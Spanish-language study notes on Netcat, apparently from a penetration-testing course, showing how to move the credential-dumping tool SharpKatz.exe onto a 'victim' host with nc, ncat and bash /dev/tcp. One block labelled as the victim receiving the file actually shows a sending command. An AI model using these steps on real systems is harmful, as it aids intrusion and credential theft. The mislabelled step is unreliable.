---

---
----
- Tags: #bash #TCP/IP #UDP
------
## ¿Qué es Netcat? 

> Una herramienta versátil de red para leer y escribir datos a través de conexiones TCP o UDP.
### Sintaxis básica

Modo cliente (connect to somewhere):
```none
nc [opciones] [dirección IP/nombre del host] [puerto]
```

Modo servidor (listen for inbound):
```none
nc -l -p port [opciones] [nombre del host] [puerto]
```

### Opciones y parámetros principales
 
 - **`-l`**: Escucha de conexiones entrantes (modo servidor). 
 - **`-z`**: Escaneo de puertos sin enviar datos. 
 - **`-v`**: Modo verbose, muestra detalles de la conexión. 
 - **`-p`**: Especifica el puerto. 
 - **`-e`**: Ejecuta un comando o shell en la conexión.
 - **`-n`**: Forzar uso de IPs, deshabilitando DNS

### Transferencia de archivos con NetCat y Ncat

El objetivo o máquina atacante puede ser utilizado para iniciar la conexión, lo que es de ayuda si un firewall no permite el acceso al objetivo. Vamos a ver un ejemplo donde enviamos una herramienta al objetivo. En este caso, transferiremos la herramienta [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) desde nuestra máquina atacante a la máquina víctima. Vamos a ver dos métodos. Primero, con el método `nc`, en modo escucha con el parámetro `-l` y en el puerto 8000, redirigiendo el `stdout` usando el símbolo `>` seguido del nombre del archivo, en este caso, `SharpKatz.exe`.

##### Netcat - Máquina víctima - Escuchando en el puerto 8000

```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```

Si la máquina víctima está usando Ncat, necesitamos especificar `--recv-only` para cerrar la conexión una vez la transferencia ha terminado.

```shell-session
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

Desde nuestro host de atacante, nos conectamos a la máquina víctima en el puerto 8000 usando Netcat y enviamos el archivo como input a Netcat. La opción `-q 0` le dirá a Netcat cerrar la conexión cuando haya finalizado. De esta forma, sabremos cuando se ha completado la transferencia

##### Netcat - Máquina atacante - Enviando el archivo a la máquina víctima

```bash
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
# Ejemplo usando Netcat original 
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

Usando netcat en nuestra máquina atacante, podemos optar por `--send-only` en vez de `-q`. Este flag, cuando se usa tanto en conexión como escucha, le dice a Ncat terminar cuando su input ha acabado.

##### Ncat - Máquina atacante - Enviando el archivo a la máquina víctima

```bash
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
# Ejemplo usando Ncat
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

En lugar de escuchar en nuestra máquina comprometida, podemos conectarnos a un puerto en nuestro host de ataque para realizar la operación de transferencia de archivos. Este método es útil en escenarios donde un firewall bloquea las conexiones entrantes. Escuchemos en el puerto 443 en nuestro Pwnbox y enviemos el archivo **SharpKatz.exe** como entrada a Netcat.

##### Máquina atacante - Enviando el archivo como input a Netcat

```shell-session
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

##### Conexión a netcat para recibir el archivo en la máquina víctima

```shell-session
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

##### Máquina atacante - Enviando el archivo como input a Ncat

```shell-session
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

##### Conexión a Ncat para recibir el archivo en la máquina víctima

```shell-session
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

Si no tenemos netcat o ncat en la máquina víctima, podemos usar `/dev/tcp/`, pues bash soporta operaciones de lectura/escritura. 

```shell-session
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

